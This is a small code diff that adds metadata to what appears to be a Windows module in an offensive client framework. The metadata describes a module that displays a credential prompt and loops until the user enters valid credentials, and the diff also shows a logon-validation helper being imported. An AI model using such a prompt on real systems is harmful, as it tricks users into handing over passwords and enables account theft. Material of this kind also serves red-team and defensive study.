@@ -1,5 +1,13 @@
-import subprocess
+SCRIPT_METADATA = {
+    "name": "win/cred/prompt_credentials",
+    "display_name": "Prompt for Credentials",
+    "description": "Display a Windows credential prompt and validate the entered credentials, looping until valid",
+    "platforms": ["windows"],
+    "category": "Credential",
+    "params": []
+}
 
+import subprocess
 from client.commands.platform.utils.win_util import logon_user
 
 print("Waiting for valid credentials...")
